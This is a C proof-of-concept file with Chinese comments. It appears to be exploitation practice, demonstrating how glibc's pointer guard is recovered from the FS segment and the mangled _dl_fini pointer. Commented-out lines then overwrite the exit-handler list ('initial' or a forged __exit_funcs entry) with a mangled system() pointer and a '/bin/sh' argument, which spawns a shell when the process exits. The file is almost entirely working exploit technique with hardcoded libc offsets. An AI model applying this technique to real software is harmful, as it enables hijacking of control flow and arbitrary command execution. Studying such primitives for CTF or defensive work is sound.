#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned long long rotate_left(unsigned long long value, int left)
{
    return (value << left) | (value >> (sizeof(unsigned long long) * 8 - left));
    // value << left 将 value 左移 left 位，溢出的高位被丢弃。
    // value >> (bits_in_long_long - left) 将 value 右移 64 - left 位，即把溢出的高位移回低位。
    // 最后，通过按位或 (|) 操作将两部分合并，得到循环左移的结果。
}

unsigned long long rotate_right(unsigned long long value, int right)
{
    return (value >> right) | (value << (sizeof(unsigned long long) * 8 - right));
}


int main() {
 unsigned long long fs_base;
 unsigned long long tls_dtor_list_addr;
 unsigned long long random_number;
 unsigned long long random_number_caculate;
 char *system_ptr = (char *)&system;
 printf("system:%p\n",system_ptr);
 char *initial = (char *)(&system+0x1a68d0);
 char *_dl_fini = (char *)(&system+0x1c1830);  
 char *__exit_funcs = (char *)(&system+0x1a4528);
 asm("mov %%fs:0, %0" : "=r" (fs_base));// 使用汇编嵌入获取FS寄存器的值
 random_number = *(unsigned long long *)(fs_base + 0x30);  // random number 
 random_number_caculate=rotate_right(*(unsigned long long *)(initial+0x18),0x11)^(unsigned long long )_dl_fini;
 printf("%p random_number_caculate  vs %p leak read random_number\n",random_number_caculate,random_number);
 char *str_bin_sh = malloc(0x20);
 strcpy(str_bin_sh,"/bin/sh");
 char *ptr = malloc(0x40);
 // or change initital 0x18 and 0x20
//  *(unsigned long long *)(initial+0x18) = rotate_left((unsigned long long)system_ptr ^ random_number,0x11);  // func ptr
//  *(unsigned long long *)(initial+0x20) = str_bin_sh;  //arg 

 // or  change __exit_funcs for fake initial addr
//  *(unsigned long long *)(ptr)=0;
//  *(unsigned long long *)(ptr+0x8)=1;
//  *(unsigned long long *)(ptr+0x10)=4;
//  *(unsigned long long *)(ptr+0x18) = rotate_left((unsigned long long)system_ptr ^ random_number,0x11);  // func ptr
//  *(unsigned long long *)(ptr+0x20) = str_bin_sh;  //arg 
//  *(unsigned long long *)__exit_funcs = ptr;   
  return 0;
}